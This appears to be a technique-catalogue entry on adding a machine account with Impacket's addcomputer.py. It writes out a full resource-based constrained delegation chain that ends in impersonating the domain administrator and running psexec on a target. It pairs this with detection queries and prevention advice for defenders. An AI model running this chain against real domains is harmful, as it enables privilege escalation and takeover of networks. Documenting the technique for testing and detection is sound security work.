name: addcomputer.py - Add Machine Account to Domain
description: Impackets addcomputer.py adds a machine account to the domain. By default, any domain user can add up to 10 computers (ms-DS-MachineAccountQuota). The created machine account is needed for RBCD attacks, relay attacks, and S4U2Self abuse where you need a computer account you control.
notes:
=== THE IDEA ===
ms-DS-MachineAccountQuota (default: 10) allows any domain user
to add up to 10 computer accounts. This is a prerequisite for
RBCD attacks where you need a computer account you control.

=== ADD MACHINE ACCOUNT ===
  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip <dc_ip> <domain>/<user>:<pass>

=== CHECK MAQ ===
  # PowerShell:
  Get-ADObject -Identity "DC=<domain_short>,DC=local" -Properties ms-DS-MachineAccountQuota
  # ldapsearch:
  ldapsearch -H ldap://<dc_ip> -D "<user>@<domain>" -w "<pass>" -b "DC=<domain_short>,DC=local" ms-DS-MachineAccountQuota

=== USE IN RBCD CHAIN ===
  # 1. Add machine account
  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 <domain>/<user>:<pass>
  # 2. Set RBCD delegation
  python3 rbcd.py -delegate-from FAKE01$ -delegate-to <target>$ -action write <domain>/<user>:<pass>
  # 3. Get ticket via S4U
  python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator <domain>/FAKE01$:Password123
  # 4. Use ticket
  export KRB5CCNAME=administrator.ccache
  python3 psexec.py -k -no-pass <target>.<domain>

=== POWERSHELL ALTERNATIVE ===
  New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString "Password123" -AsPlainText -Force)

references.title: MITRE T1136.002 - Create Account: Domain Account

recommended.note: RBCD requires a controlled machine account - addcomputer creates one.

defense.why_it_works: The ms-DS-MachineAccountQuota attribute (default 10) allows any authenticated user to add computer accounts to the domain. These accounts have SPNs and can be used for delegation attacks.
defense.impact: Enables RBCD attacks, Kerberos relay attacks, and S4U2Self impersonation by providing a controlled computer account.
defense.detection: [MITRE T1136.002] Event 4741 (computer account created) by non-admin users.
defense.artifacts: Event 4741 (computer account created); new computer object in AD with non-standard naming.
defense.splunk_spl:
index=windows EventCode=4741
| where NOT match(SubjectUserName, "SYSTEM|admin")
| table _time, SubjectUserName, TargetUserName, TargetDomainName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4741
| where SubjectUserName !in ("SYSTEM") and SubjectUserName !contains "admin"
| project TimeGenerated, SubjectUserName, TargetUserName
defense.prevention: Set ms-DS-MachineAccountQuota to 0; require admin approval for computer account creation; monitor Event 4741.

detections.name: Machine account creation by non-admin user
detections.logic:
SecurityEvent
| where EventID == 4741
| where SubjectUserName !in ("SYSTEM", "ANONYMOUS LOGON")
| where SubjectUserName !has "admin"
| project TimeGenerated, SubjectUserName, TargetUserName, SubjectDomainName
detections.false_positives: Helpdesk staff joining workstations; SCCM deployments
detections.tuning: Whitelist known machine-join service accounts; alert on any non-standard computer creation
